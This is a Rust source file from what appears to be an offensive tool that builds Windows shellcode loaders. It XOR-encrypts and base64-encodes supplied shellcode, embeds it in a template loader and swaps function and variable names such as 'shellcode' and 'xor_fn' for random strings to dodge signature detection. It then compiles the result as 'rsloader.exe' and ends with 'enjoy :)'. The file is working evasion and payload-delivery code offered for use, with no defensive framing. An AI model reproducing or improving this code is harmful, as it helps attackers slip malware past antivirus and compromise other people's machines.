use rust_embed::RustEmbed;
use std::fs::{write,create_dir_all};
use rand::Rng;
use whoami;
use rsmaker::{xor_fn,complie,base64_encode,CHARSET,PASSWORD_LEN};



#[derive(RustEmbed)]
#[folder = "temp"]
struct Asset;






pub fn make_rs(base64_shellcode:String,xor:u8)->(){
    let head = Asset::get("base64xor/head.rs").unwrap();
    let head_str = std::str::from_utf8(head.data.as_ref()).unwrap();

    let model = Asset::get("base64xor/model.rs").unwrap();
    let model_str = std::str::from_utf8(model.data.as_ref()).unwrap();

    let toml = Asset::get("base64xor/Cargo.toml").unwrap();
    let toml_str = std::str::from_utf8(toml.data.as_ref()).unwrap();

    let config = Asset::get("base64xor/config.toml").unwrap();
    let   config_str = std::str::from_utf8(config.data.as_ref()).unwrap();

    let shellcode = format!(r#"const SHELLCODE: &str = "{}";"#,base64_shellcode);
    let xor = format!("\nconst XOR: u8 = {};\n",&xor);

    let mut new_string = String::from("");

    new_string.push_str(head_str);
    new_string.push_str("\n");
    new_string.push_str(&shellcode);
    new_string.push_str(&xor);
    new_string.push_str(model_str);

    let new_string = radom_fn(new_string);
    let _ = create_dir_all("loader/src");
    let _ = create_dir_all("loader/.cargo");
    let _ = write(format!("loader/src/main.rs"), new_string);
    let _ = write(format!("loader/Cargo.toml"), toml_str);
    let config_str = &config_str.replace("XXXXXXXX", &whoami::username());
    let _ = write(format!("loader/.cargo/config.toml"), config_str);

}

pub fn radom_fn(text:String)->String{
    let mut rng = rand::thread_rng();
    let password1: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            char::from(unsafe { *CHARSET.get_unchecked(idx) })
        }).collect();
    let password2: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            char::from(unsafe { *CHARSET.get_unchecked(idx) })
        }).collect();
    let password3: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            char::from(unsafe { *CHARSET.get_unchecked(idx) })
        }).collect();
    let password4: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            char::from(unsafe { *CHARSET.get_unchecked(idx) })
        }).collect();
    

    let mut text_rand = text.replace("base64_decode", &password1);
    text_rand = text_rand.replace("xor_fn", &password2);
    text_rand = text_rand.replace("shellcode", &password3);
    text_rand = text_rand.replace("SHELLCODE", &password4);
    
    text_rand
}


pub fn run(shellcode:Vec<u8>)->std::io::Result<()>{
    println!("current username is {}",whoami::username());
    let xor:u8 = rand::thread_rng().gen();

    println!("The xor random number is {}",&xor);

    
    let base64_shellcode = base64_encode(xor_fn(shellcode,xor));
    println!("Encrypting shellcode...");
    println!("Done...");

    println!("Encrypting loader code.....");
    println!("Done...");
    make_rs(base64_shellcode, xor);

    println!("Compiling please wait.....");
    
    complie();

    println!("Succeed!,the loader name is rsloader.exe, enjoy :)");
    Ok(())
}